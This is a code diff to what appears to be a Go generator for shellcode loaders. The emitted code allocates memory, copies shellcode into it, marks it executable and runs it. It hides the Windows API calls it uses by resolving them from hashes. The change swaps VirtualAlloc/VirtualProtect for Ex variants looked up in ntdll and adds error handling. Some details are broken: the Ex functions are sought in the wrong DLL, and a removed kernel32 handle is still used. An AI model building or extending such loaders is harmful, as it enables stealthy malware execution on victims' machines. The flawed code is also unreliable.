@@ -59,11 +59,10 @@ const (
 )
 
 var (
-    kernel32 = syscall.MustLoadDLL("kernel32.dll")
 	ntdll = syscall.MustLoadDLL("ntdll.dll")
 
-	VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
-	VirtualProtect = kernel32.MustFindProc("VirtualProtect")
+	VirtualAllocEx = ntdll.MustFindProc("VirtualAllocEx")
+	VirtualProtectEx = ntdll.MustFindProc("VirtualProtectEx")
 	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
 
@@ -84,8 +83,8 @@ func (t SyscallTemplate) Process() string {
 			also, we should probably only read from ntdll
 		*/
 
-		hashedVirtualAlloc := t.HashMethod.HashItem("VirtualAlloc")
-		hashedVirtualProtect := t.HashMethod.HashItem("VirtualProtect")
+		hashedVirtualAllocEx := t.HashMethod.HashItem("VirtualAllocEx")
+		hashedVirtualProtectEx := t.HashMethod.HashItem("VirtualProtectEx")
 		hashedRtlCopyMemory := t.HashMethod.HashItem("RtlCopyMemory")
 
 		hashedMethod := t.HashMethod.String()
@@ -98,23 +97,16 @@ func (t SyscallTemplate) Process() string {
     }
     defer ntdll.Close()
 
-
-    kernel32, err := pe.Open("C:\\Windows\\System32\\kernel32.dll"); if err != nil {
-        fmt.Println(err.Error())
-        os.Exit(1)
-    }
-    defer kernel32.Close()
-
-
     var addr uintptr
 	regionsize := uintptr(len(shellcode))
-    VirtualAlloc, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "__HASHED_VIRTUALALLOC__", kernel32)
+    VirtualAllocEx, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "__HASHED_VIRTUALALLOCEX__", kernel32)
 	if err != nil {
 		log.Fatal(err)
 	}
 
     addr = loader.HashedCall(
-        VirtualAlloc,
+        VirtualAllocEx,
+		syscall.InvalidHandle,
         0,
         regionSize,
         MEM_COMMIT|MEM_RESERVE,
@@ -140,13 +132,14 @@ func (t SyscallTemplate) Process() string {
     }
 
     oldProtect := PAGE_READWRITE
-    VirtualProtect, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "__HASHED_VIRTUALPROTECT__", ntdll)
+    VirtualProtectEx, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "__HASHED_VIRTUALPROTECTEX__", ntdll)
     if err != nil {
 		log.Fatal(err)
 	}
 
     rvalue := loader.HashedCall(
-        VirtualProtect,
+        VirtualProtectEx,
+		syscall.InvalidHandle,
         addr,
         regionsize,
         PAGE_EXECUTE_READ,
@@ -155,22 +148,26 @@ func (t SyscallTemplate) Process() string {
         log.Fatal("Error: invalid return value")
     }
 
-    _, _, _ = syscall.SyscallN(addr)
+    _, _, err = syscall.SyscallN(addr)
+	if err != nil { 
+		log.Fatal(err)
+	}
 
         `)
 
 		template = strings.ReplaceAll(template, "__HASH__METHOD__", hashedMethod)
-		template = strings.ReplaceAll(template, "__HASHED__VIRTUALPROTECT__", hashedVirtualProtect)
-		template = strings.ReplaceAll(template, "__HASHED__VIRTUALALLOC__", hashedVirtualAlloc)
+		template = strings.ReplaceAll(template, "__HASHED__VIRTUALPROTECTEX__", hashedVirtualProtectEx)
+		template = strings.ReplaceAll(template, "__HASHED__VIRTUALALLOCEX__", hashedVirtualAllocEx)
 		template = strings.ReplaceAll(template, "__HASHED__RTLCOPYMEMORY__", hashedRtlCopyMemory)
 		return template
 	}
 
+	// syscall.InvalidHandle means self for windows
 	return fmt.Sprintf(`
-	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	addr, _, _ := VirtualAllocEx.Call(syscall.InvalidHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	oldProtect := PAGE_READWRITE
-	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	_, _, _ = VirtualProtectEx.Call(syscall.InvalidHandle,  addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	_, _, _ = syscall.SyscallN(addr)
 `)
 }
@@ -193,10 +190,10 @@ __IMPORT__PROCESS__
 
 }
 `
-	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
-	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
-	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
-	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)
+	template = strings.ReplaceAll(template, "__IMPORT__STATEMENT__", t.Import())
+	template = strings.ReplaceAll(template, "__CONST__STATEMENT__", t.Const())
+	template = strings.ReplaceAll(template, "__IMPORT__INIT__", t.Init())
+	template = strings.ReplaceAll(template, "__IMPORT__PROCESS__", t.Process())
 
 	return template
 }
